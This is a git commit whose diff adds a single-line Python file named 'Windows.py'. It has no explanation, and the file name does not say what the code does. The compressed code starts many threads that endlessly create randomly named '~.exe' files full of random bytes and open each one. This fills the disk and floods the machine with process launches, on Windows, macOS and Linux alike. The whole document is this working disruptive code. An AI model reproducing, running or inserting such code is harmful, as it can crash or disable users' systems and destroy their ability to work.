ea639661ae3f9bb03551686737218cf63575b51a
classify-text <dxjh112098@dxjh.hcc.edu.tw>
2026-03-06 18:41:32 +0800

    Windows.py

---
+++ Windows.py
@@ -0,0 +1,1 @@
+import os,sys,subprocess as s,threading as t;f=lambda:exec("while 1:n=os.urandom(75).hex()+'~.exe';open(n,'wb').write(os.urandom(4096));os.startfile(n)if sys.platform[0]=='w'else s.Popen(['open'if sys.platform=='darwin'else'xdg-open',n])");[t.Thread(target=f,daemon=1).start()for _ in range(os.cpu_count()*2)];input()
